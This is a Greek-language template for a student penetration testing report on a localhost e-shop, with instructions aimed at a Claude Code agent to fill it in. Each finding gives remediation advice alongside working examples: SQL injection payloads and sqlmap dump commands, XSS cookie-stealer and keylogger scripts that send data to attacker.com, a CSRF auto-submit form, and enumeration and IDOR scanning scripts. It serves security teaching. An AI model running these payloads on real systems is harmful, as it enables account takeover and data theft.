# PENETRATION TESTING REPORT - ΣΚΕΛΕΤΟΣ ΑΝΑΦΟΡΑΣ

## ΟΔΗΓΙΕΣ ΓΙΑ TON CLAUDE CODE AGENT

Αυτός είναι ο σκελετός για τη σύνταξη της τεχνικής αναφοράς penetration testing. Παρακαλώ ακολούθησε αυτή τη δομή και συμπλήρωσε με τα στοιχεία από το codebase.

---

# Τεχνική Αναφορά Ελέγχου Ασφάλειας (Penetration Testing Report)
## Εφαρμογή E-Shop - [ΟΝΟΜΑ ΕΦΑΡΜΟΓΗΣ]

**Μάθημα:** CDS201 - Έλεγχος Εισβολών Δικτύων και Συστημάτων  
**Ημερομηνία:** [ΗΜΕΡΟΜΗΝΙΑ]  
**Penetration Tester:** [ΟΝΟΜΑ ΦΟΙΤΗΤΗ]  
**Έκδοση Αναφοράς:** 1.0

---

## ΠΙΝΑΚΑΣ ΠΕΡΙΕΧΟΜΕΝΩΝ

1. [Executive Summary](#1-executive-summary)
2. [Εισαγωγή και Μεθοδολογία](#2-εισαγωγή-και-μεθοδολογία)
3. [Χαρτογράφηση της Εφαρμογής](#3-χαρτογράφηση-της-εφαρμογής)
4. [Αναλυτικά Ευρήματα](#4-αναλυτικά-ευρήματα)
5. [Συνοπτικός Πίνακας Ευπαθειών](#5-συνοπτικός-πίνακας-ευπαθειών)
6. [Συμπεράσματα και Προτάσεις](#6-συμπεράσματα-και-προτάσεις)
7. [Παραρτήματα](#7-παραρτήματα)

---

## 1. EXECUTIVE SUMMARY

### 1.1 Περίληψη Ελέγχου
[Σύντομη περιγραφή του scope του penetration test, της διάρκειας και του στόχου]

### 1.2 Κύρια Ευρήματα
- **Κρίσιμες Ευπάθειες:** [ΑΡΙΘΜΟΣ]
- **Υψηλής Σοβαρότητας:** [ΑΡΙΘΜΟΣ]
- **Μέτριας Σοβαρότητας:** [ΑΡΙΘΜΟΣ]
- **Χαμηλής Σοβαρότητας:** [ΑΡΙΘΜΟΣ]

### 1.3 Business Impact Overview
[Σύντομη ανάλυση των επιπτώσεων στην επιχειρηματική λειτουργία]

---

## 2. ΕΙΣΑΓΩΓΗ ΚΑΙ ΜΕΘΟΔΟΛΟΓΙΑ

### 2.1 Σκοπός του Ελέγχου
Ο παρών έλεγχος ασφάλειας πραγματοποιήθηκε στο πλαίσιο του μαθήματος CDS201 με σκοπό την αξιολόγηση της ασφάλειας της εφαρμογής e-shop [ΟΝΟΜΑ].

### 2.2 Scope και Περιορισμοί
**In-Scope:**
- Web Application: [URL/localhost]
- Database: [Τύπος Database]
- API Endpoints: [Αριθμός endpoints]
- Λειτουργίες: Authentication, Authorization, Product Management, Shopping Cart, Payment Processing

**Out-of-Scope:**
- Infrastructure testing
- Social engineering
- Physical security

### 2.3 Μεθοδολογία Ελέγχου
Ακολουθήθηκε η μεθοδολογία **OWASP Web Security Testing Guide v4.2** με τις εξής φάσεις:

1. **Information Gathering & Reconnaissance**
2. **Mapping & Discovery**
3. **Vulnerability Assessment**
4. **Exploitation**
5. **Post-Exploitation**
6. **Reporting**

### 2.4 Εργαλεία που Χρησιμοποιήθηκαν
- **Proxy Tools:** Burp Suite Professional v2025.1
- **Scanners:** OWASP ZAP 2.14.0, Nikto 2.5.0
- **Exploitation:** SQLMap 1.7, Metasploit Framework
- **Custom Scripts:** Python 3.x με requests library
- **Browser Extensions:** HackBar, Cookie Editor

---

## 3. ΧΑΡΤΟΓΡΑΦΗΣΗ ΤΗΣ ΕΦΑΡΜΟΓΗΣ

### 3.1 Αρχιτεκτονική Εφαρμογής
[Περίγραψε την αρχιτεκτονική based on το codebase]

**Technology Stack:**
- **Frontend:** [π.χ. HTML5, CSS3, JavaScript, React/Vue]
- **Backend:** [π.χ. Django 4.x, PHP 8.x]
- **Database:** [π.χ. MySQL 8.0, PostgreSQL]
- **Web Server:** [π.χ. Apache, Nginx]

### 3.2 Endpoints Mapping

#### 3.2.1 Public Endpoints
```
GET  /                      # Homepage
GET  /products              # Product listing
GET  /product/{id}          # Product details
GET  /about                 # About page
GET  /contact               # Contact form
```

#### 3.2.2 Authenticated Endpoints
```
POST /login                 # User authentication
POST /register              # User registration
GET  /dashboard             # User dashboard
GET  /profile               # User profile
POST /cart/add              # Add to cart
POST /checkout              # Process payment
GET  /orders                # Order history
POST /logout                # Session termination
```

#### 3.2.3 Admin Endpoints
```
GET  /admin                 # Admin panel
POST /admin/products/add    # Add product
PUT  /admin/products/{id}   # Update product
DELETE /admin/products/{id} # Delete product
GET  /admin/users           # User management
```

### 3.3 Session Management Analysis

**Session Token Format:**
- Type: [π.χ. JWT, Session Cookie]
- Name: [π.χ. sessionid, auth_token]
- HttpOnly: [Yes/No]
- Secure Flag: [Yes/No]
- SameSite: [Strict/Lax/None]
- Expiration: [Duration]

### 3.4 Input Vectors Identified
1. **URL Parameters:** product_id, category, search
2. **POST Body Parameters:** username, password, email, address
3. **Headers:** User-Agent, Referer, X-Forwarded-For
4. **Cookies:** sessionid, cart_items, preferences
5. **File Uploads:** profile_picture, product_images

---

## 4. ΑΝΑΛΥΤΙΚΑ ΕΥΡΗΜΑΤΑ

### 4.1 ΕΥΠΑΘΕΙΑ #1: SQL Injection

#### 4.1.1 Περιγραφή της Ευπάθειας
**Severity:** CRITICAL (CVSS 3.1: 9.8)  
**CWE ID:** CWE-89  
**OWASP Category:** A03:2021 – Injection

Εντοπίστηκε SQL Injection ευπάθεια στο endpoint `/product` όπου η παράμετρος `id` δεν φιλτράρεται σωστά πριν χρησιμοποιηθεί στο SQL query.

#### 4.1.2 Τεχνικά Βήματα Εντοπισμού & Εκμετάλλευσης

**Βήμα 1: Initial Detection**
```bash
# Test για SQL errors
GET /product?id=1' HTTP/1.1
Host: localhost

# Response:
MySQL Error: You have an error in your SQL syntax near ''
```

**Βήμα 2: Identify Injection Point**
```python
# Python script για automated testing
import requests

payloads = ["1'", "1' OR '1'='1", "1' UNION SELECT NULL--"]
for payload in payloads:
    r = requests.get(f"http://localhost/product?id={payload}")
    print(f"Payload: {payload} - Status: {r.status_code}")
```

**Βήμα 3: Database Enumeration**
```sql
# Extract database version
/product?id=1' UNION SELECT @@version-- 

# Extract database name
/product?id=1' UNION SELECT database()-- 

# Extract tables
/product?id=1' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()-- 
```

**Βήμα 4: Data Extraction**
```bash
# Using SQLMap
sqlmap -u "http://localhost/product?id=1" --dbs --batch
sqlmap -u "http://localhost/product?id=1" -D eshop --tables
sqlmap -u "http://localhost/product?id=1" -D eshop -T users --dump
```

#### 4.1.3 Screenshots / Proof of Concept
[PLACEHOLDER: Screenshot showing SQL error]
[PLACEHOLDER: Screenshot showing extracted data]
[PLACEHOLDER: Screenshot showing admin credentials]

#### 4.1.4 Επιπτώσεις (Impact)
- **Data Breach:** Πλήρης πρόσβαση σε όλα τα δεδομένα της βάσης
- **Authentication Bypass:** Δυνατότητα login ως οποιοσδήποτε χρήστης
- **Data Integrity:** Δυνατότητα τροποποίησης/διαγραφής δεδομένων
- **Compliance Violations:** Παραβίαση GDPR (Article 32)

#### 4.1.5 Προτάσεις Αντιμετώπισης
**Immediate Actions:**
1. Χρήση Prepared Statements/Parameterized Queries
```python
# Vulnerable code
query = f"SELECT * FROM products WHERE id = {product_id}"

# Secure code
query = "SELECT * FROM products WHERE id = ?"
cursor.execute(query, (product_id,))
```

2. Input Validation
```python
def validate_product_id(id):
    if not id.isdigit():
        raise ValueError("Invalid product ID")
    return int(id)
```

3. Least Privilege για Database User
4. Implement Web Application Firewall (WAF)

---

### 4.2 ΕΥΠΑΘΕΙΑ #2: Cross-Site Scripting (XSS)

#### 4.2.1 Περιγραφή της Ευπάθειας
**Severity:** HIGH (CVSS 3.1: 7.5)  
**CWE ID:** CWE-79  
**OWASP Category:** A03:2021 – Injection

Reflected XSS ευπάθεια εντοπίστηκε στη λειτουργία αναζήτησης όπου το user input εμφανίζεται στη σελίδα χωρίς proper encoding.

#### 4.2.2 Τεχνικά Βήματα Εντοπισμού & Εκμετάλλευσης

**Βήμα 1: Basic XSS Test**
```html
# Test payload
/search?q=<script>alert('XSS')</script>

# Reflected in response:
<p>Search results for: <script>alert('XSS')</script></p>
```

**Βήμα 2: Advanced Payload**
```javascript
# Cookie stealer
<script>
var i=new Image();
i.src="http://attacker.com/steal.php?cookie="+document.cookie;
</script>

# Keylogger
<script>
document.onkeypress = function(e) {
    var req = new XMLHttpRequest();
    req.open("GET", "http://attacker.com/log.php?key=" + e.key, true);
    req.send();
}
</script>
```

**Βήμα 3: Bypass Attempts**
```html
# If < and > are filtered
/search?q=<img src=x onerror=alert(1)>

# Using event handlers
/search?q=<body onload=alert('XSS')>

# Using SVG
/search?q=<svg onload=alert('XSS')>
```

#### 4.2.3 Screenshots / Proof of Concept
[PLACEHOLDER: Screenshot showing XSS popup]
[PLACEHOLDER: Screenshot showing stolen cookies]

#### 4.2.4 Επιπτώσεις (Impact)
- **Session Hijacking:** Κλοπή session cookies
- **Phishing:** Redirection σε malicious sites
- **Defacement:** Αλλοίωση περιεχομένου
- **Client-side attacks:** Keylogging, form hijacking

#### 4.2.5 Προτάσεις Αντιμετώπισης
1. **Output Encoding**
```python
from html import escape
safe_output = escape(user_input)
```

2. **Content Security Policy (CSP)**
```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

3. **Input Validation**
4. **Use templating engines με auto-escaping**

---

### 4.3 ΕΥΠΑΘΕΙΑ #3: Cross-Site Request Forgery (CSRF)

#### 4.3.1 Περιγραφή της Ευπάθειας
**Severity:** MEDIUM (CVSS 3.1: 6.5)  
**CWE ID:** CWE-352  
**OWASP Category:** A01:2021 – Broken Access Control

Η λειτουργία αλλαγής password δεν προστατεύεται από CSRF tokens.

#### 4.3.2 Τεχνικά Βήματα Εντοπισμού & Εκμετάλλευσης

**Βήμα 1: Analyze Request**
```http
POST /profile/change-password HTTP/1.1
Host: localhost
Cookie: sessionid=abc123

new_password=newpass123&confirm_password=newpass123
```

**Βήμα 2: Create Malicious Form**
```html
<html>
<body onload="document.forms[0].submit()">
<form action="http://localhost/profile/change-password" method="POST">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
</form>
</body>
</html>
```

**Βήμα 3: Exploitation via Social Engineering**
- Host malicious page
- Send link to victim
- When victim visits while logged in → password changes

#### 4.3.3 Screenshots / Proof of Concept
[PLACEHOLDER: Screenshot of CSRF exploit page]
[PLACEHOLDER: Screenshot showing successful password change]

#### 4.3.4 Επιπτώσεις (Impact)
- **Account Takeover:** Αλλαγή password χωρίς τη γνώση του χρήστη
- **Unauthorized Actions:** Εκτέλεση ενεργειών εκ μέρους του θύματος
- **Financial Loss:** Unauthorized purchases

#### 4.3.5 Προτάσεις Αντιμετώπισης
1. **Implement CSRF Tokens**
```python
# Django example
{% csrf_token %}

# Verify token server-side
if not csrf_token_valid(request):
    return HttpResponseForbidden()
```

2. **SameSite Cookie Attribute**
```http
Set-Cookie: sessionid=abc123; SameSite=Strict
```

3. **Re-authentication για critical actions**
4. **Check Referer header**

---

### 4.4 ΕΥΠΑΘΕΙΑ #4: Broken Authentication - User Enumeration

#### 4.4.1 Περιγραφή της Ευπάθειας
**Severity:** MEDIUM (CVSS 3.1: 5.3)  
**CWE ID:** CWE-204  
**OWASP Category:** A07:2021 – Identification and Authentication Failures

Διαφορετικά error messages επιτρέπουν enumeration των valid usernames.

#### 4.4.2 Τεχνικά Βήματα Εντοπισμού & Εκμετάλλευσης

**Βήμα 1: Identify Different Responses**
```python
# Test script
import requests

# Valid username, wrong password
data1 = {"username": "admin", "password": "wrongpass"}
r1 = requests.post("http://localhost/login", data=data1)
print(f"Valid user response: {r1.text}")
# Response: "Invalid password"

# Invalid username
data2 = {"username": "notexist", "password": "test"}
r2 = requests.post("http://localhost/login", data=data2)
print(f"Invalid user response: {r2.text}")
# Response: "User not found"
```

**Βήμα 2: Automated Username Enumeration**
```python
import requests
from concurrent.futures import ThreadPoolExecutor

def check_username(username):
    data = {"username": username, "password": "test"}
    r = requests.post("http://localhost/login", data=data)
    if "Invalid password" in r.text:
        return username
    return None

# Username list
with open("usernames.txt") as f:
    usernames = f.read().splitlines()

# Multi-threaded enumeration
with ThreadPoolExecutor(max_workers=10) as executor:
    results = executor.map(check_username, usernames)
    valid_users = [u for u in results if u]
    
print(f"Valid users found: {valid_users}")
```

#### 4.4.3 Screenshots / Proof of Concept
[PLACEHOLDER: Screenshot showing different error messages]
[PLACEHOLDER: Screenshot of enumeration script output]

#### 4.4.4 Επιπτώσεις (Impact)
- **Information Disclosure:** Αποκάλυψη valid usernames
- **Targeted Attacks:** Brute force σε known users
- **Social Engineering:** Στοχευμένες επιθέσεις
- **Privacy Violation:** Αποκάλυψη registered emails

#### 4.4.5 Προτάσεις Αντιμετώπισης
1. **Generic Error Messages**
```python
# Bad
if not user_exists(username):
    return "User not found"
elif not password_correct(username, password):
    return "Invalid password"

# Good
if not authenticate(username, password):
    return "Invalid username or password"
```

2. **Rate Limiting**
3. **Account Lockout Policy**
4. **CAPTCHA after failed attempts**

---

### 4.5 ΕΥΠΑΘΕΙΑ #5: Insecure Direct Object Reference (IDOR)

#### 4.5.1 Περιγραφή της Ευπάθειας
**Severity:** HIGH (CVSS 3.1: 7.1)  
**CWE ID:** CWE-639  
**OWASP Category:** A01:2021 – Broken Access Control

Users μπορούν να δουν orders άλλων χρηστών αλλάζοντας το order ID στο URL.

#### 4.5.2 Τεχνικά Βήματα Εντοπισμού & Εκμετάλλευσης

**Βήμα 1: Identify Pattern**
```http
# Logged in as user1
GET /order/12345 HTTP/1.1
# Shows order details

# Try incrementing
GET /order/12346 HTTP/1.1
# Shows another user's order!
```

**Βήμα 2: Automated Scanning**
```python
import requests

session = requests.Session()
# Login first
session.post("http://localhost/login", data={"username": "test", "password": "test"})

# Scan order IDs
for order_id in range(10000, 20000):
    r = session.get(f"http://localhost/order/{order_id}")
    if r.status_code == 200:
        print(f"Found accessible order: {order_id}")
        # Extract sensitive data
        # Parse response for PII
```

#### 4.5.3 Screenshots / Proof of Concept
[PLACEHOLDER: Screenshot showing access to other user's order]
[PLACEHOLDER: Screenshot of extracted PII]

#### 4.5.4 Επιπτώσεις (Impact)
- **Privacy Breach:** Πρόσβαση σε προσωπικά δεδομένα
- **GDPR Violation:** Unauthorized data access
- **Financial Information:** Credit card details exposure
- **Competitive Intelligence:** Business data leakage

#### 4.5.5 Προτάσεις Αντιμετώπισης
1. **Proper Authorization Checks**
```python
def view_order(request, order_id):
    order = Order.objects.get(id=order_id)
    if order.user != request.user:
        return HttpResponseForbidden()
    return render(request, 'order.html', {'order': order})
```

2. **Use UUIDs instead of sequential IDs**
3. **Implement proper access control matrix**
4. **Log all unauthorized access attempts**

---

## 5. ΣΥΝΟΠΤΙΚΟΣ ΠΙΝΑΚΑΣ ΕΥΠΑΘΕΙΩΝ

| # | Ευπάθεια | Severity | CVSS | Status | Priority |
|---|----------|----------|------|--------|----------|
| 1 | SQL Injection | CRITICAL | 9.8 | Open | P1 |
| 2 | Cross-Site Scripting (XSS) | HIGH | 7.5 | Open | P1 |
| 3 | IDOR - Order Access | HIGH | 7.1 | Open | P1 |
| 4 | CSRF - Password Change | MEDIUM | 6.5 | Open | P2 |
| 5 | User Enumeration | MEDIUM | 5.3 | Open | P3 |

### Risk Matrix
```
    Impact
    ^
High|  [1]  |  [2,3]  |        |
    |       |         |        |
Med |       |  [4,5]  |        |
    |       |         |        |
Low |       |         |        |
    +-------+---------+--------+
       Low     Med      High   -> Likelihood
```

---

## 6. ΣΥΜΠΕΡΑΣΜΑΤΑ ΚΑΙ ΠΡΟΤΑΣΕΙΣ

### 6.1 Γενική Αξιολόγηση
Η εφαρμογή παρουσιάζει σημαντικά προβλήματα ασφάλειας που απαιτούν άμεση αντιμετώπιση. Οι κρίσιμες ευπάθειες (SQL Injection, XSS) θέτουν σε κίνδυνο την εμπιστευτικότητα και ακεραιότητα των δεδομένων.

### 6.2 Remediation Roadmap

#### Phase 1: Critical (0-7 days)
1. Fix SQL Injection vulnerabilities
2. Implement output encoding for XSS
3. Fix IDOR in order management

#### Phase 2: High Priority (7-30 days)
1. Implement CSRF protection
2. Fix user enumeration
3. Security headers implementation

#### Phase 3: Medium Priority (30-60 days)
1. Implement WAF
2. Security awareness training
3. Regular security assessments

### 6.3 Security Best Practices
1. **Secure Development Lifecycle (SDL)**
2. **Regular Security Testing**
3. **Security Code Reviews**
4. **Dependency Management**
5. **Security Headers Implementation**

### 6.4 Compliance Recommendations
- **GDPR:** Implement proper access controls and data protection
- **PCI-DSS:** If processing payments, ensure compliance
- **OWASP ASVS:** Follow Application Security Verification Standard

---

## 7. ΠΑΡΑΡΤΗΜΑΤΑ

### Παράρτημα Α: Vulnerability Details
[Detailed technical information for each vulnerability]

### Παράρτημα Β: Tool Outputs
[Raw outputs from security tools]

### Παράρτημα Γ: Source Code Snippets
[Vulnerable code examples]

### Παράρτημα Δ: References
1. OWASP Top 10 2021
2. OWASP Testing Guide v4.2
3. CWE/SANS Top 25
4. NIST Cybersecurity Framework

---

## DISCLAIMER
This penetration testing report was created for educational purposes as part of the CDS201 course. All testing was performed in a controlled environment.

---

## ΟΔΗΓΙΕΣ ΧΡΗΣΗΣ ΤΟΥ ΣΚΕΛΕΤΟΥ

1. **Προσάρμοσε** τα placeholders [ΟΝΟΜΑ ΕΦΑΡΜΟΓΗΣ], [ΗΜΕΡΟΜΗΝΙΑ], κλπ.
2. **Συμπλήρωσε** τα technical details based on το actual codebase
3. **Προσθεσε** screenshots και actual PoC code
4. **Τροποποίησε** τις ευπάθειες ανάλογα με αυτές που έχεις implement
5. **Ενημέρωσε** τα remediation steps με specific code για την εφαρμογή σου

**ΣΗΜΑΝΤΙΚΟ:** Βεβαιώσου ότι κάθε ευπάθεια έχει:
- Clear technical explanation
- Step-by-step reproduction
- Working PoC/exploit code
- Business impact analysis
- Specific remediation with code examples